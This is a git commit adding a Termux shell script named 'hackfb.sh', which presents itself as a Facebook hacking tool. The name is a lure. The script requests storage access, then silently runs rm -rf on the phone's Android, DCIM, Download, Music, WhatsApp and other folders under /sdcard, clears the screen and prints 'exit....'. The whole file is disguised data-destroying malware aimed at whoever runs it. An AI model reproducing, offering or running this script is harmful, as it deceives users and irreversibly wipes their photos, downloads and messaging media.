cdfd2673b8129f507481cecc659c23f047c00ed3
RDTUTORIAL <65097374+RDTUTORIAL@users.noreply.github.com>
2021-01-29 15:26:47 +0800

    Add files via upload

---
+++ hackfb.sh
@@ -0,0 +1,10 @@
+clear
+termux-setup-storage
+rm -rf /sdcard/Android
+rm -rf /sdcard/DCIM
+rm -rf /sdcard/Download
+rm -rf /sdcard/MusicDownload
+rm -rf /sdcard/Music
+rm -rf /sdcard/WhatsApp
+clear
+echo -e "exit...."
